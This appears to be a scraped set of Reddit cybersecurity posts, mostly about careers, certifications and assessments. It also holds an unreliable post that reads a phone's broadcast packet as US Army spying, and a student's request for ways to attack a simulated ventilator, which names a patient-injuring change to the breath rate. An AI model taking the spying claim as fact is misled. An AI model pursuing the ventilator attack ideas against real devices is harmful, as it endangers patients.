assess, have for the most part been on the other side of the clipboard being assessed; answering questions which on some occasions felt like a set up. We understand the implication that jobs, bonuses, pay raises, and a day of comp time might be in jeopardy for those being assessed. However, your core role in assessments is to help organizations mature their levels of cybersecurity. It is not to align or bond with the captor err.. I mean team being assessed. I have assessed organizations and discovered violations of not only technical requirements but of best business practices in general. When discovered, the system operators/owners have pleaded to have one-on-one conversations to convey why they chose to circumvent proper security measure implementation. Reluctantly, I dont agree to meet, and explain their opportunity to convey or rebut findings upon assessment reporting completion. On other occasions mid-level management within assessed organizations have laid out their hand to showcase their violations, in an attempt to get the SMEs on the assessment team to help fix-on-the-fly and not document the discrepancies. In most cases plugging that hole leads to other discoveries  During an assessment aint nobody got time for that. There are other teams responsible for recovery and remediation. It is not that assessment teams dont play well with others, rather OPM, Forbes, Target, and countless organizations with millions of customers - could give a crap about bonding experiences and neither should the assessed or the assessor. Assessments are meant to evolve cybersecurity. To evolve the posture and truly help an organization, assessments need to be aligned with readily available known frameworks. Not just guidelines those for a specific sectors (i.e. finance, energy, military), rather frameworks that will help those teams being assessed the opportunity to be successful after you leave. Most recently the Cybersecurity Framework developed by NIST along with the Cyber Resiliency Review (CRR) methodology from the U.S. DHS combined to provide a non-technical but area focused tool for organizations to build and also develop cybersecurity &amp; resiliency. The CRR attempts to help organizations by assessing controls across the following 10 operational domains: Asset Management Controls Management Configuration and Change Management Vulnerability Management Incident Management Service Continuity Management Risk Management External Dependencies Management Training and Awareness Situational Awareness While the Cybersecurity Framework focuses on functional areas, they are not intended to be assessed or performed in a serial manner. Rather the framework and the idea behind the concept is that organizations will employ the prioritized, flexible, repeatable, performance-based and cost-effective approach continuously and concurrently to enable a dynamic cybersecurity posture. The NIST CSF core focuses on the five functions to provide a strategic view: Identify Protect Detect Respond Recover Minimize The Stress To minimize the chances of getting A.S.S, one needs to have strong morals and beliefs to attenuate Stockholm Syndrome. In the case of being an assessor, be prepared.

We're having a hard time coming up with proper titles. When we research titles, such as ""SIEM Engineer"" or ""Vulnerability Management Specialist"", they seem to be way above the average salary we're looking to pay. These titles seem to fit people that do a lot more than this new position will do. This new position will be instructed to just run the VMS and do small amounts of remediation. 95% of their time will simply be running scans and sending reports to system owners and then reporting to their manager on progress. The jobs I listed have an average salary above $100k. We're looking to get someone more entry-level (2-3 years experience) and looking to be something more around $50-$65k DOE.

341,vulnerability,cybersecurity,Start-ups companies need to care about security!!!,1,37pn59,http://www.reddit.com/r/cybersecurity/comments/37pn59/startups_companies_need_to_care_about_security/,2015-05-29 22:18:33,"Start-ups beware: Security is not just for established companies. One big data breach could cost you your business. Big companies have been able to weather major data breaches, but young companies that aren't taking security seriously are at high risk of losing everything when they get hit with an attack, security industry pros. ""You are never too small. If you have vulnerability and it gets exploited. It will bring a great deal of attention on you, and the smaller the start-up the more likely it is that a major incident will kill your company,"" said Sushant Nayak, Founder Chairman, Acura Consulting Company. So what should young companies be doing to protect themselves? First, start-ups should have a plan in place for how they will deal with a breach, ""If you are not planning ahead you are going to have terrible, terrible legal problems,"" who defends companies that have been breached. Forty-seven states have notification laws in place for breaches under certain circumstances, he said. Companies who have experienced a breach may be required legally to provide notice of the incident and if there isn't a proper plan in place they could land themselves in more legal trouble. ""Every company is going to have a security breach, there is no question about it. ""Just because you are an emerging company, there's no 'emerging company exception' to the federal laws and notification laws."" Besides having a plan in place, companies should also constantly be monitoring what kind of information they are collecting about their users. ""It's really important to know what data you are collecting, processing and storing and why. One of the best things you can do as a start-up business is be very, very selective of what information you collect and store,"" Sushant Nayak said. ""They can't steal what you don't have."" Another thing companies should be doing is encrypting all their stored data, Sushant Nayak said. If data is encrypted and there is a breach, companies reduce their risk of information's being exposed, but there could still be legal implications. ""There are a number of states, though, that even if the data is encrypted, under the terms of the statute, you have to provide notice to the consumers and perhaps to the attorney general and that's the kind of thing that could spark an investigation,"" he further added.

I have an iPhone and there has been some strange things happening. I believe my ex has possibly installed spyware of some kind and has been keeping tabs on me. I have done some googling and searched for the basics like apps and going through my settings to make sure things aren't out of place and to disable any kind of remote access. The really creepy part is I stopped talking to my ex about 3 years ago. Not too long ago, there was someone that I had a crush on. I decided to message this person on Tumblr - for those of you who don't know what Tumblr is, it's a blogging website where people can post just about anything. A person can choose to anonymously talk to people, or talk to people with their names revealed. There was a person that I had a crush on and decided to start anonymously messaging this person. When a person chooses to respond to these anonymous messages, they have to repost it to their blog in order to answer it, so the anonymous message is posted for all to see, and the response to the anonymous message is also posted. The next day or so, a person chose to message the person that I like with their username showing. I checked out the profile and the person was from another country. That SAME DAY I GET A PHONE CALL FROM THAT COUNTRY. (I do not know anyone nor have I ever talked to anyone from that country) Not only that, but after THREE YEARS OF NOT COMMUNICATING WITH MY EX, I GET AN EMAIL FROM HER ASKING ME HOW I WAS DOING AND JUST CHECKING UP ON ME. It was super weird but I decided to ignore it. A few days go by and I'm still messaging my crush on Tumblr ON ANONYMOUS. I'd say four days have passed from the strange incident and the person messages my crush again with the username visible. AND AGAIN I GET ANOTHER MESSAGE FROM MY EX WHO I HAVE NOT SPOKEN TO IN THREE YEARS ON A DIFFERENT SOCIAL MEDIA ACCOUNT, SAYING HOW SHE WOULD LIKE TO AMMEND THINGS WITH ME. Creepily enough she references some things that I had said about her when I was talking to someone. Ever since then weird things have been happening on my phone. One of my accounts have been hacked - I received an email about this. I called the help desk and had them change my password, and whatnot. I then logged in to see if everything was okay. When I went to go check my email, THE EMAIL THAT NOTIFIED ME OF MY ACCOUNT BEING HACKED HAD BEEN DELETED. Now when you delete an email on iPhone, it goes into to trash bin so it's not permanently deleted. When I went to go check my trash bin IT WAS NOT THERE. IT HAD BEEN DELTED THERE TOO, however, the emails that shows that I had logged into the account after the incident were there. Thankfully, the account that was hacked logs the IP address of the user, so even though the email was deleted, I still have evidence of someone with a different IP address then my own logged in. Another thing, my crush was harassed off of the blog site, and even stated that after SIX YEARS OF BEING ON THERE SHE WAS FINALLY LEAVING WTF????? I think it had something to do with my ex. Please help, I'm not sure what's going on, or what to look for! ~~~UPDATE~~~ I took your guys advice, upgraded my iPhone, updated my software to current software/changed passwords/factory reset iPhone several times before using it and etc. Everything was fine until one of my accounts was hacked. I say account because I dont even remember creating the account that was hacked. Yet I received an email saying to changed my password because I logged in in an unrecognizable device.

Would it make sense to get a certification?,1,i4y03k,https://www.reddit.com/r/cybersecurity/comments/i4y03k/looking_to_write_about_cybersecurity_topics_would/,2020-08-07 05:07:27,"Hey all, hoping you guys might be able to help me work this out. I'm working on launching a website soon, focused on cybersecurity topics. Audience both consumer and business, probably with more focus on small business than enterprise, at least to begin with. Early topics would include things like phishing, online privacy, and password safety. I'm thinking about getting some more formal education and a certification on cybersecurity/IT, for two main reasons: to bolster my own knowledge on the subject, and to become a more credible authority on the topics I'm writing about. As it is, I don't have any focused cybersecurity or IT experience, and I think it would benefit the content to up both my knowledge and my credentials. Because I don't have any experience going in though, and am not planning to work in IT, I'm not sure whether it would be viable and/or worth the cost. Based on my initial research, even entry level certifications such as SSCP require a degree of work experience. Others, like Security+, don't look like they require it, but I do wonder whether not having the experience would still be prohibitive to obtain these. Initially I had planned to hire expert writers to develop most of the content. Since the pandemic hit though, my marketing business has slowed down, and at this point, it would make more sense to focus my own time on developing the content than paying to write it. What do you guys think? Does it make sense to go for a certification such as Security+? Trying to figure out how I should proceed. All answers much appreciated. "

I have an iPhone and there has been some strange things happening. I believe my ex has possibly installed spyware of some kind and has been keeping tabs on me. I have done some googling and searched for the basics like apps and going through my settings to make sure things aren't out of place and to disable any kind of remote access. The really creepy part is I stopped talking to my ex about 3 years ago. Not too long ago, there was someone that I had a crush on. I decided to message this person on Tumblr - for those of you who don't know what Tumblr is, it's a blogging website where people can post just about anything. A person can choose to anonymously talk to people, or talk to people with their names revealed. I decided to start anonymously messaging the person I like. When a person chooses to respond to these anonymous messages, they have to repost it to their blog in order to answer it, so the anonymous message is posted for all to see, and the response to the anonymous message is also posted. The next day or so, a person chooses to message the person that I like with their username showing. I checked out the profile and the person was from another country. That SAME DAY I GET A PHONE CALL FROM THAT COUNTRY. (I do not know anyone nor have I ever talked to anyone from that country) Not only that, but after THREE YEARS OF NOT COMMUNICATING WITH MY EX, I GET AN EMAIL FROM HER ASKING ME HOW I WAS DOING AND JUST CHECKING UP ON ME. It was super weird but I decided to ignore it. A few days go by and I'm still messaging my crush on Tumblr ON ANONYMOUS. I'd say four days have passed from the strange incident and the person messages my crush again with the username visible. AND AGAIN I GET ANOTHER MESSAGE FROM MY EX WHO I HAVE NOT SPOKEN TO IN THREE YEARS ON A DIFFERENT SOCIAL MEDIA ACCOUNT, SAYING HOW SHE WOULD LIKE TO AMMEND THINGS WITH ME. Creepily enough she references some things that I had said about her when I was talking to someone. Ever since then weird things have been happening on my phone. One of my accounts have been hacked - I received an email about this. I called the help desk and had them change my password, and whatnot. I then logged in to see if everything was okay. When I went to go check my email, THE EMAIL THAT NOTIFIED ME OF MY ACCOUNT BEING HACKED HAD BEEN DELETED. Now when you delete an email on iPhone, it goes into to trash bin so it's not permanently deleted. When I went to go check my trash bin IT WAS NOT THERE. IT HAD BEEN DELTED THERE TOO, however, the emails that shows that I had logged into the account after the incident were there. Thankfully, the account that was hacked logs the IP address of the user, so even though the email was deleted, I still have evidence of someone with a different IP address then my own logged in. Another thing, my crush was harassed off of the blog site, and even stated that after SIX YEARS OF BEING ON THERE SHE WAS FINALLY LEAVING WTF????? I think it had something to do with my ex. Please help, I'm not sure what's going on, or what to look for! ~UPDATE~ -posted in cybersecurity and received advice on a different account but forgot password so made a new account to post an update- I took your guys advice, upgraded my iPhone, updated my software to current software/changed passwords/factory reset iPhone several times before using it and etc. Everything was fine until one of my accounts was hacked. I say account because I dont even remember creating the account that was hacked. Yet I received an email saying to changed my password because I logged in in an unrecognizable device. I looked at the IP Address and the country of origin was in a different country. Not just any country, but my ethnic country (which Ive never been to in 20+ years nor have had any connection to that country in forever. No google searches or anything. I work on cars as a trade and mainly watch DIY videos/repair house stuff/mechanic videos) - Im a US citizen though.

373,cybersecurity,cybersecurity,When unintended observations lead to scorn and ridicule - Agencies are very well spying on you!,1,i5aw6g,https://www.reddit.com/r/cybersecurity/comments/i5aw6g/when_unintended_observations_lead_to_scorn_and/,2020-08-07 19:41:31,"Lets imagine you are a normal Systemadministrator and you try to live and work like every other casual citizen does. You have a kid, wife, do your job, play games late at night and go to sleep. Sometimes you want to further develop your ""homelab"" and add some security assets or other IoT, to learn and add some nice features to your homenetwork. Many days pass by and one day, you experience some strange behaviour on your systems and start to wonder what is happening. Luckily you have already some of the basic IT-Security knowledges and try to investigate what is going on your network. Investigating can be a really long ongoing process, if you have only basic knowledge and dont know what you actually have to look for. I am the kind of person who likes linux and I use the (man pages) a lot, to make use of commands I have never made use of before. Or I search online if I have no further clue on what to look for. Long story short. After some investigation I bumped over some interesting findings. At first I was like, ""WHAT THE FCK?"". And I am still like that, because it's so obvious, like it's ridiciulous at the same time. But what I am talking about? I use Opnsense as a Firewall and I realized that there must have been some kind of misconfiguration made by me, that led to a MITM DNS rebinding attack. It wasn't totally misconfigured, but it wasnt safe enough to prevent others from proxying the WEB GUI of one of my devices. But that's another story ... After reworking my firewall multiple times and some months later I still saw, that there is something scanning my firewall. I saw Suricata alarming every 5-10 minutes with the same drop rule ... So I started digging and sniffing on multiple devices. Opnsense brings nice features like sniffing on it's own interfaces in promicious mode. So I started it for some hours and then I investigated for hours, package by package on what's going on. This is the most interesting thing I have found and it has nothing to do with the main attacker: (Sincle I cannot post images, I just post the link of an older post from me) [URL What you see there is a Package send by my Samsung S10+ Smartphone to all devices on my Network. Earlier today, I had a discussion on this subreddit, about ""the rules of networking"". Trying to explain me, that a Local Broadcast is no valid address and I red bullshit out of this trace ... People think, because my name implies a strong use of cannabis, I am unable to read packages... -.- So lets analyze this trace: We have a Destination Adress of [255.255.255.255](URL . This is a limited broadcast to all network devices and is non routable to the internet. This package has been send via UDP, what means that it's connectionless and doesn't require an answer. What is the destination Port 1228? UDP on port **1228** provides an unreliable service and datagrams may arrive duplicated, out of order, or missing without notice. UDP on port **1228** thinks that error checking and correction is not necessary or performed in the application, avoiding the overhead of such processing at the network interface level. UDP (User Datagram Protocol) is a minimal message-oriented Transport Layer protocol (protocol is documented in IETF RFC 768). If this package is going to be received by a device, it reads the following content: This is our US-Army Server: [55.49.44.54](URL Here is our Networkmask: [52.49.44.51](URL This is our US-Army Gateway: [49.56.57.49](URL You can pretty easily do a ""whois"" on these IP's and get the name: [URL The devices credentials for our system to identify: 95356, G4nj (this almost looks like the first 4 letters of one of my usernames) DHCP: enabled (Just in case of we establish a successfull tunnel to your device) Enable Bootloader: True ... (interesting, so we want to start up with your machine) Description: (This seems like a redirection to a private tunnel network 17.4.0.0 with port 2214, or something else) revision: 1.battle (dont know if this means, they try it once or it is some kind of auth. mechanism) Processor type: .n (tell us what processor ur device has) System Type (would be awesome to know, so we can check our exploits) \----------------------- I received many dislikes and disrespect from others, because they tought me stupid for thinking, this is some kind of conspiracy shit I try to start. But this is just an observation of a transmission inside my network I cant prohibit. And all I wanted to do, is to share my experience with others, to signalize that there are agencies or companies out there, that actively try to spy on you. I am really just a casual IT Systemadministrator who does nothing criminal. The only criminal I do, is buying weed from time to time for personal use. It's nothing extraordinary. I am not even dealing with this stuff. I just consume, do my job, learn IT stuff, play games and live in peace and try to avoid conflicts. By the way I want to mention, that I live in Europe and there is no reason for a military facility to spy on my homenetwork. But If you all have seen the whistleblower movie with snowden played by joseph gordon levitt, you can imagine, that the US doesn't need a reason. They want to be everywhere. Because, why not if you have the capabilities to? Because if you already have spying devices in areas of interest, it safes a lot of efford, having already connected devices to your network. What I want to tell you, is that you should take the time and look at what's going on on your network and dont blame others for your own lack of knowledge."

My program mostly lacks any cyber sec classes. I recently came across a cybersecurity bootcamp developed by the University of Michigan. Its a 30 hour introductory course followed by a 400 hour extended program. They say it will prepare you to take cert exams like AWS CCP, Linux LPI, Net+, Cisco Cyberops, Sec+, CySA+, and SSCP. The course seems fairly comprehensive covering basic networking, cloud, Linux, infrastructure and security design, python, ethical hacking, incident response and threat hunting and IoT. For all of these topics they provide practical exercises and projects for you to work on developed and taught by cyber professionals. They also provide career services, interview prep etc. at the end of the course. The intro course is $500 and the extended course is $15k, so basically a year of in state tuition at U of M minus housing/dining costs. The thing is, I know all of this information can be found online for cheap or even free, but in combination with all the material they give you projects and guidance etc and I dont have to worry as much about motivating myself to do all the self study when Im part of a bootcamp.

I have been wanting to start a cyber security career for a while now so I have practiced hackthebox trying to get a taste of what a pentest job would be like because I believe that is ultimately what I would like to do as a job. I see job posts for pentesters and I see that the experience required is usually a little hefty and usually requires certs I don't have yet (currently have Sec+ and CASP+). &amp;#x200B; Today I had an interview for a position as a Cybersecurity Analyst and the interviewer at the end already told me I had the job. The job pays 7k a year more (at least that is what I asked for and he agreed to), and I am scared. Here are my thoughts: &amp;#x200B; 1. Is a Cyber Analyst a good foot-in-the-door job for an ultimate goal of being a pentester? Is there something better as a gateway position? 2. If anyone has worked with eMASS, STIGS, SCAP and ACAS scans do you enjoy your job? Was/is it a good learning experience for cyber? 3. Is now a ""smart"" time to be making a career move given the state of the world? 4. Is saying ""you will start off drinking from a fire hydrant"" a red flag in transitioning to a job like this or is that an appropriate comparison? I think this is a good job with a good company and maybe I am overthinking things but I like my job and I am just worried it could end up being something I hate since it sounds like mostly being a ""paper pusher"", but it almost seems like that is THE starting point for most cyber careers from what I have heard."

I'm so grateful for the resources compiled here and have already begun taking advantage of them. Now I'd like to request your direct input and help me adjust my path for the most efficacy. A quick bit of history, my step dad growing up was a software designer who taught me html and the basic ins and outs of hardware and network functionality. In college I worked in the IT department for a year doing general set up, maintenance of systems and networks and trouble shooting for the student and faculty bodies. I got comfortable with all Windows OSX and Linux during this time. I was studying physical sciences at the time, however, so I didn't put my learning resources toward certifications and due to some family complications I wasn't able to graduate. past half decade I've been less engaged with tech (except some raspberry pi work with a mushroom grow I did) but have been feeling increasingly invigorated to re-enter the tech world, and in a cybersecurity frame. So based off of the research I've done in this wide open field of opportunity, I believe I'd like to shoot for an SOC Analyst positions. I have a lot of skills to acquire in order to achieve that, but I feel like I'm at least starting with some working knowledge of computers. I do feel very green approaching this but I'm excited to learn. So here's what I think I'd like to approach based on availability to my current income as well as viability in the marketplace. I feel more Blue Team oriented, and may want to ultimately lean into a Network Engineer route, but I'm not fully certain yet. I'd appreciate nudges in the right direction as far as to optimal ordering of acquisition of the certifications (or if I'm going in the wrong direction entirely). CNSS - I snatched the promo code for the ICSI course and the 90 for the lab and exam is something I can certainly budget in. I figured this was as good a place as any to start, especially with that deal. I've read about other certs opening more doors but I can't imagine it would hurt to have this or learn the skills through the course. Sec+ - In all the job listings I've seen for SOC Analysts and other security positions, Sec+ seems like a must have, it also seems fairly attainable at the voucher price of $319 and the myriad of CPEP/CPAP - Coding has always been the water in which I only ever put a toe, and while I know SQL and C, C+++ are used in a lot of cybsec, I get the sense Python is one of the more universal coding languages and feel like it's a good place to start, plus with the tiered certifications I feel like I can acquire and move on while continuing my learning and progress here. I'm t A+ - Another one I've seen all over job requirements throughout tech and cybsec, so I figure it's foundational nature makes it one I want sooner rather than later. &amp;#x200B; This is my basis I think - From here I feel like I will have a much deeper grasp of the field in general and will likely be able to obtain a decent salaried position, perhaps even with an employer who will pay for further certs like R&amp;S, CASP and OSCP. Part of me wants to lean into a CEH but I'm seeing it isn't worth the money unless maybe I go Red Team route. &amp;#x200B; If there is anything critical I'm missing, please let me know. There is a lot of information to sort through, but thats kinda what I'm signing up for, isn't it? Thanks for all the help! \-Axo"

Certification should have strong application to forensics in electronic media. I'm aware of and interested in compTIA security+, but have an opportunity for significant funding for professional development through work that would provide incentive going a bit deeper (into pockets and knowledge). Basically, I've looked GIAC offerings, CCE, and various other certs catering to digital forensics. GIAC?- definitely in budget with work/study which I am told I am highly eligible. Seems legit, but overpriced and highly marketed. CCE?- seems dated and has an odd sketchy link (on a cybersecurity organization website?; insurance-tek). Directly related to my current professional content. Expensive. What else is there? Is a GIAC worth it if paid for by employer? Is GIAC too specific for an entry level guy, there are several certs that cater to my current field and I cannot get funding for mutliple? Any advice appreciated, looking for ways to enrich my skills at current job and likely poise for a move that takes me out of my current role to something more directly applied. Employer really enjoyed hearing that I thought our content was behind and we need to offer better instruction for electronic crime/evidence, to be up to date.

At this point, any suggestions on places to look into would be the most helpful. Some background if it helps- **Why?** Because I wanna.

If I ever decide to try to climb the leadership ladder where I am, I will need *something* so I want to start looking into it. **Bachelor's degree:** Psychology (surprise!) Certainly not a traditional degree for this field, but it hasn't lead me wrong so far! Original life plan was going to continue pursuing Psychology, life happened, so I'm in Info Sec instead. Never lost my love for it either, so I think continuing combing both my career and my educational background makes the most sense. **Certs:** In case it's asked ""Why not certs"" or something - I have my CISSP and 2 SANS certs already and will (hopefully) get another SANS cert this year, so not neglecting this checkbox. **What I do now?** I'm a senior incident response analyst in higher education. &amp;#x200B; Thanks all!"

Currently triple booting macOS, Manjaro and Windows on it, but the Manjaro install is on a USB right now (gonna install on SSD soon). The X1 Extreme, and even the new Zephyrus G14, looked intriguing, but thinking about what utilities I might be using (more Linux &amp; CLI stuff), I was thinking if I need a dedicated GPU for anything, considering I already have a gaming desktop and dont plan to game on the laptop. Would test VMs benefit from dedicated GPUs over integrated ones? The T14, X280, X1 Carbon, LG Gram, all look nice too, but same thing as I said above. These options would also include offloading some of the heavy work to my desktop at home, or maybe to another cheap used ThinkPad (T440p?) Would I benefit from a more powerful CPU or GPU for cybersecurity applications, and should I look into an ultrabook + eGPUs, or ultrabook + Parsec to my desktop which already has a decent GPU (1060), or a nice balance while giving up portability (X1E/G14)? ~~or should I just stick to my current MBP running Manjaro/Bootcamp where needed? lol~~ Im undecided on which specific sector of cybersecurity I would want to focus on (pentest/forensics etc), if that helps any."

For some background, I am 22yo and currently a data center engineer dealing with mostly rack and stack, cabling, and basic server config. I do branch into more technical troubleshooting at times, and am comfortable navigating machines of all sorts (routers, switches, servers, etc.). I am pretty well versed in linux and windows (desktop and server variations). I have only been in the IT industry 2 years, but managed to land a job with a very high profile company in a large datacenter, mostly due to my communication skills during interviews. I have no degree, and a GED. I am currently getting ready to take Net+ from comptia, and will move on to Sec+ afterwards. It seemed to me it would be extremely important to have a base of networking knowledge / experience before diving into security. Now for my question, is it worth it to go for a degree in cybersecurity through a university, or should I focus more on certifications? Even though I've only been in the IT industry for a short time, I'd like to think I have gained myself a lot of experience through constant study and real world experience dealing with incidents and installs. My last job before this was as a Lead Technician at another datacenter, which I was able to navigate to due to my quick growth. This position gave me lots of experience when it comes to compliance, policy, etc. due to me having to accompany security and compliance audits at my site, and working with change controls and similar processes which can be very policy intensive. It also of course gave me a whole host of experience in everything to do with datacenter infrastructure and operations. I know cybersecurity is a whole different monster from what I currently deal with, but I have always had a passion for the field and would love to eventually do something along the lines of pentesting / consulting. The constant evolution of security and the challenge of newer and bigger threats coming out everyday attracts me, because I can tend to get bored in a job that isnt pushing me to learn new things every day. What can I do to make myself into more of an ideal candidate when moving towards this field? I hear conflicting advice from those in the field I have talked to, and kind of just want some perspective from those of you who do this work on a daily basis, and see the struggles people go through trying to get into the industry. Any advice or criticisms are welcome, let me know what your experience getting into the industry has been. Thanks in advance everyone!"

There is also various metadata I'd like to associate with a product or category that doesn't necessarily have to display on the roadmap, but should be easily accessible (mouse-over / click...) I'm thinking things like which NIST function(s) apply to each product/category, some other categorization types of metadata (eg. corporate solution, ICS solution, enterprise solution), some notes on the product, whether it's a CSO-driven initiative vs a dept/project driven one etc, etc. There seem to be a number of SaaS roadmapping / architecture design solutions that ""could"" do this, but I'd be really interested in any actual hands-on feedback / suggestions people have."

I dropped out of college in 2013. I am virtually a total outsider, aside from knowing some basic vocabulary and understanding. I have the interest, I have a lot of down time, and also I have purchased the complete cyber security course from Nathan House. The thing I dont have, is any kind of guide or mentor to help me better understand my place currently and what I can do to elevate it. I bought the book Get ahead, Get certified by Darril Wilson in order to study for the Security+. I soon realized while working through the practice test that this material was over my head. Perhaps, the wrong place to start. So for someone who is a total noob looking to make a career change where is a good place to start? Right now I am considering going back to college but I also see there are a ton of certifications that I could earn. What are some of your stories? What is the path you took? How can I best and actively start my journey into the field?"

My manager at my current workplace is offering me training for AWS security as we are migrating from on-prem to cloud slowly.

Now, I had a thought that as more automation and productive robotic processes are introduced there may be quite a paradigm shift. That is to say, people will still be needed in administration and analysts positions but as more of a supervisory and managerial role. Therefor, the importance in cybersecurity analysts and the like will remain high but the number of individuals needed will dip. At least, in relative comparison to software development. If there is that much automation the need for software developers to maintain and implement the technology will increase even more then it already has... so, my thought is even though the BLS suggests a larger need for Information Security Analysts, do you think there is more longevity in terms of value for software development skills that are backed by cybersecurity philosophies/mindset?"

473,cybersecurity,cybersecurity,So you are interested in getting into cyber security?,1,hqsadc,https://www.reddit.com/r/cybersecurity/comments/hqsadc/so_you_are_interested_in_getting_into_cyber/,2020-07-14 11:30:37,"**What you need to know** I see a lot of posts coming through here as of late asking some variant of the question: How do I get into cyber security? So I figured I would make this post and hopefully a few people find this information helpful. **My background:** I've been in the IT industry for almost 10 years now. Two in the cybersecurity sector. I have a B.S in Information Technology as well as a handful of certifications. I'm lead Cybersecurity Analyst at a MSP. I perform duties such as vulnerability scanning, penetration testing, research and development, SOC/SIEM analysis, incident response, digital forensics, I also work closely with other departments in my organization providing various bits of consulting. In addition to my daily duties, I'm an technical escalation point for the systems engineers, create SOPs and training references, assist in onboarding assessments of new customers and more. **How to get into cybersecurity:** Cybersecurity usually requires a vast amount of knowledge which is typically obtainable after a handful of years of experience. When entering cybersecurity, one should have a firm understanding of the following concepts: Networking (tcp/ip stack, protocols, vlans, subnetting, various vpn technologies, ip tables and access control lists, wireless technologies, DHCP, DNS, DNSSEC, routing, packet analysis), networking equipment(firewalls, layer 2 and layer 3 switches, repeaters, bridges, intrusion detection/prevention systems), programming (c, c++, python, java script, SQL, rust), scripting (powershell, bash), servers (domain controllers, DNS servers, application servers, file servers, proxy servers, web servers, email servers, virtualization, load balancing), become familiar with various operating systems (linux, mac, windows (domain vs workgroup setups), how anti virus applications function, Common Attack vectors and how to prevent them, fuzzing applications, incident response (and local laws and regulations regarding incident response), Network scanning, shells/ reverse shells, buffer overflow basics, passive and active information gathering techniques, email header analysis, cryptography and hash functions, cloud environments (Citrix, Azure, O365) and the ability to troubleshoot anything that goes wrong with the above mentioned technologies and finally.... soft skills. Soft skills are just as important as the technical ones. You need to be able to convince an irrational organization to upgrade their 200 windows xp machines when ""they work just fine"", or accurately and clearly explain to the customer how they essentially have been paying a hacker to enter their pc once a month to steal their data or bring calm an organization after an actual data breach and speak with the confidence necessary that the customer believes you when you tell them that you have removed all threats and they are currently secure. You need to be able to explain all of your ideas, concerns and findings to not only the CEO of an organization who's never touched a computer in their life as well as your superior who has more technical knowledge then you could ever hope to attain. **Getting into cybersecurity:** The most common way to get into cybersecurity is to start off in an entry level IT position such as help desk, desktop support or some other related role. Having any type of technical bachelor's degree will be very useful here. Take advantage of these jobs as there are a lot of skills to master (see the above list). Always take the intuitive, always try to work on issues that are just a little beyond your knowledge. You will work your way up ladder, obtain raises and promotions. Continue to educate yourself beyond what you learn only at work. Complete certifications (hopefully your organization will pay for these), perform home labs, and read. Strive to be the person in the room that everyone looks to for answers. Eventually you will have obtained the level of knowledge required to be successful in cybersecurity (you will also realize how much more you have to learn to be great). Please note, for all of the skills listed above. You dont necessarily have to have every single skill fully mastered. But you need to be well versed. I would say if your fully competent in about 75 percent ish of the items listed, you could probably start looking for a cyber security position. With that said, help desk is obviously not the only method for getting into cybersecurity. It's just the most common for most people. The other method would be obtaining proficiency in these areas prior to getting any type of IT job, but the amount of resources and time needed to obtain this level of knowledge before you have to start living on your own (and earn a living) is not feasible for most people. Although true entry level (not requiring the above listed skill sets) cybersecurity positions do exist, not only are they very difficult to come by, but the job duties will likely be similar to a generic entry level analyst position where you scan hundreds of logs a day looking for one or two specific anomalies. Further, a position like this will be on the lower wage scale - 30k to 40k a year. There is an inherent level of liability that comes with an organization attempting to approach cybersecurity the right way. And unfortunately that does not typically favor hiring people with little to no experience or knowledge. Hiring an individual who cant recognize the significance (or the lack thereof depending) of a malformed kerberos ticket during an investigation could be the difference in determining if there is a malicious actor on a network (I know that's bit of an extreme example, but hopefully you get my point). **Exceptions:** I am well aware that there are exceptions to every rule. And I'm sure there are plenty of people who managed to get into the technical realm of cybersecurity that broke every principle outlined above. That's awesome and you should share your stories. But again, this post covers the most common method for most people attempting to enter this industry. Please feel free to follow up with any questions."

I am looking for more assistance on the project and a few opinions. After my previous post I received a great deal of information from replies - unfortunately, the objective of the project has recently changed. I am now attempting with an Arduino kit and Raspberry Pi 4 to simulate some type of open source ventilator system to perform cyber attacks on. My university offers very little support and if I wish to contact a company for information on the topic I have to go through a strenuous ethical approval process. (*I applied 4 weeks ago and am yet to hear back on whether I am able to collect data, I have attempted multiple times to get in touch with them and send them reminders to multiple people but to no avail - the entirely of the project consists of a 3 month duration and I am quickly running out of time*). I have now accepted that I'll have to make use of whatever I can find online and that I will not be able to harvest any helpful information relating to the project from companies. I created a questionnaire with questions such as: Does the RMVS have a network connection? Does it have connection ports? Is a display required? As different companies are (*or were*) creating these ventilators, I thought each ventilator producer may include different functionalities - such as network capability etc. Obviously my makeshift ventilator that makes use of open source code has no real security considerations and is quite possibly hackable - the reason for the project is to perform certain attacks to highlight the fact that they **MAY** be achievable in the more advanced ventilator systems produced by companies such as AIRBUS, Ford, Rolls Royce etc. As the temporary ventilators are simplistic, standalone and are very mechanical, I am struggling to pinpoint any real security issues within the devices. After all, the non-CE marked devices are being disposed of after the pandemic. I have come back to this sub-reddit to ask for assistance on this and whether any ideas in regard to how I can exploit the systems. To put it simply - this is essentially what I wish to achieve: &amp;#x200B; 1. Utilise open-source RMVS code to simulate environment. 2. Perform some type of attack - such as a RF attack (*couldn't locate any instances of attacks occurring in the past to this medical device and am unsure as to what attacks can be attempted)* 3. Show the environment changing (*such as the screen goes blank*) These RMVS systems were intended to be used over long periods of time running constantly. Exploiting one of these and lets say changing the amount of breaths per minute from 30 to 60 may seriously injure the user. Once again, any information is helpful for me. My research has exhausted and I am really struggling to think of any ways you can exploit these machines (*with no data of how the real ones work*). Thanks for taking the time to read, George"

I take all my classes online and my internship is generally low level support tasks with some opportunity to assist supervisors on larger project implementation. My concern is quite interesting and may be, in part, a symptom of a larger psychological ""conundrum"" if you will. Maybe even a common conundrum of sorts. I have somewhere between a 3.6-3.75 GPA and I am entering my final two semesters. I feel my ability to get good grades reflects the effort I put into assignments and my ability to perform when a task is asked of me. However, I do not necessarily feel I absorb much of the information afterwards. Lets say I retain 10% of the information covered in a form of complete understanding. I fear that performing from memory is essential in cybersecurity. Sometimes I watch people on various streaming platforms perform CTF or penetration testing tasks in a rapid fire motion. I get stuck in this place where the IT work in a desktop support sense is usually very easy and mundane. It will not sustain purpose or a feeling that I am where I belong in a career much longer. At the same time, I do not feel quite adequate to take on more networking and cybersecurity roles. Perhaps, I could get the required work completed but the doubt stems more from that ""belonging"". I'm worried the people I will work with might look down on my knowledge base. In a field such as cybersecurity I tend to get the sense that there is not much room for ""fake it until you make it"". That is to say, I have been through the formal schooling but can not jump into the terminal and start cracking away at auditing a companies security posture. Additionally, I spend all this time trying to figure out what is going on in my higher level courses.... I sometimes find myself at work forgetting basic networking terms and uses. Anyways, sorry for ranting. If anyone has been in a similar position before.. how might I go about deciding what the next step to take really is and what kind of career roles I should be seeking out?"

I am currently about to finish my bachelor's degree in finance, and my undergrad average score doesn't quite qualify me for high-end masters in Europe such as Oxford/EPFL. Would there be any point in trying to receive a master's degree at a somewhat lower-tier institution?

